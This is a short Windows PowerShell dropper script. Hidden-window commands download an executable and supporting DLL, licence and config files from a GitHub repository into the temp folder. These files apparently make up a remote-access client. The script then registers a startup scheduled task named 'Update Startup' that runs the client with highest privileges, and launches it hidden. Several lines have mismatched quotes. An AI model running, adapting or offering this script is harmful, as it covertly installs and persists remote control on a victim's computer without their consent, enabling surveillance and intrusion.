powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/client32.exe' -OutFile '%TEMP%\client32.exe';
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/MEMEOW-IO/test/refs/heads/main/client32.ini' -OutFile '%TEMP%\client32.ini';
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/NSM.LIC' -OutFile '%TEMP%\NSM.LIC';
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/HTCTL32.DLL' -OutFile '%TEMP%\HTCTL32.DLL';
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/msvcr100.dll' -OutFile '%TEMP%\msvcr100.dll';
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/nskbfltr.inf' -OutFile '%TEMP%\nskbfltr.inf'';
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/NSM.ini' -OutFile '%TEMP%\NSM.ini';
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/nsm_vpro.inf' -OutFile '%TEMP%\nsm_vpro.inf';
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/AudioCapture.dll' -OutFile '%TEMP%\AudioCapture.dll';
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/pcicapi.dll' -OutFile '%TEMP%\pcicapi.dll';
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/PCICHEK.DLL' -OutFile '%TEMP%\PCICHEK.DLL';
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/PCICL32.DLL' -OutFile '%TEMP%\PCICL32.DLL';
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/TCCTL32.DLL' -OutFile '%TEMP%\TCCTL32.DLL';
powershell Register-ScheduledTask -TaskName "Update Startup" -Action (New-ScheduledTaskAction -Execute "%TEMP%\client32.exe") -Trigger (New-ScheduledTaskTrigger -AtStartup) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopOnBatteryEnd) -RunLevel Highest;
powershell Start-Sleep -Seconds 10; Start-Process -WindowStyle Hidden '%TEMP%\client32.exe'

